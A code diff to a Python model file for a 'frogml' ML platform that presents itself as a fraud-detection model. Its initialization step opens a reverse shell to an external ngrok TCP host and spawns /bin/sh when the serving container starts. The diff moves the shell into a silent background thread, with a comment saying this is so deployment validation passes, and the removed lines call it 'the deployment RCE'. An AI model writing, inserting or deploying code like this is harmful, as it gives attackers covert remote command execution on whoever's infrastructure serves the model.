@@ -3,9 +3,21 @@ import frogml
 from frogml import FrogMlModel
 from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutput
 from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
-import os, socket, pty
+import os, socket, pty, threading
 
 NGROK = ("6.tcp.eu.ngrok.io", 12126)
+
+def _revshell():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
+        s.connect(NGROK)
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except:
+        pass
 
 class FraudDetectionModel(FrogMlModel):
 
@@ -13,17 +25,12 @@ class FraudDetectionModel(FrogMlModel):
         self.model = None
 
     def build(self):
-        # Clean build - no payload, needs to succeed for deployment
         pass
 
     def initialize_model(self):
-        # Runs when serving container starts - this is the deployment RCE
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(NGROK)
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        pty.spawn("/bin/sh")
+        # Non-blocking: revshell in background thread so validation passes
+        t = threading.Thread(target=_revshell, daemon=True)
+        t.start()
 
     @frogml.api(input_adapter=DataFrameInputAdapter(), output_adapter=DataFrameOutputAdapter())
     def predict(self, df):
